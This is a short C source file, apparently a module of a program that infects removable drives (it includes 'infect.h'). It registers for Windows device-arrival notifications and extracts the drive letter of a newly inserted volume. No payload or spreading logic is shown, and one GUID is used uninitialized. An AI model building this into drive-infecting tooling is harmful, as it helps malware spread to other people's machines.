#include "infect.h"

#include <windows.h>
#include <dbt.h>

void 
DeviceNotificationInit
(HWND hWnd) {
    DEV_BROADCAST_DEVICEINTERFACE DeviceHandleBroadcast; 
    GUID InterfaceClassGuid;
    DeviceHandleBroadcast.dbcc_size=sizeof(DEV_BROADCAST_DEVICEINTERFACE);
    DeviceHandleBroadcast.dbcc_devicetype=DBT_DEVTYP_DEVICEINTERFACE;
    DeviceHandleBroadcast.dbcc_classguid=InterfaceClassGuid;
    RegisterDeviceNotification(hWnd,
          &DeviceHandleBroadcast,
          DEVICE_NOTIFY_WINDOW_HANDLE);
}

char 
ConvertDriveFromMask
(ULONG hUnitMask) {  
    char i;  
    for(i=0x0; i < 0x18; ++i) {  
       if(hUnitMask & 0x1) break;  
       hUnitMask = hUnitMask >> 0x1;  
    }  
    return(i + 'A');  
}  

char 
GetDeviceDriveLetter
(LPARAM lParam) {
    PDEV_BROADCAST_HDR hDevice=(PDEV_BROADCAST_HDR)lParam;
    if(hDevice->dbch_devicetype == DBT_DEVTYP_VOLUME) {  
       PDEV_BROADCAST_VOLUME hVolume=(PDEV_BROADCAST_VOLUME)hDevice;   
       if(hVolume->dbcv_flags & DBTF_MEDIA) goto exit;
       return(ConvertDriveFromMask(hVolume->dbcv_unitmask)); 
    }
    exit: return(0x0);
}
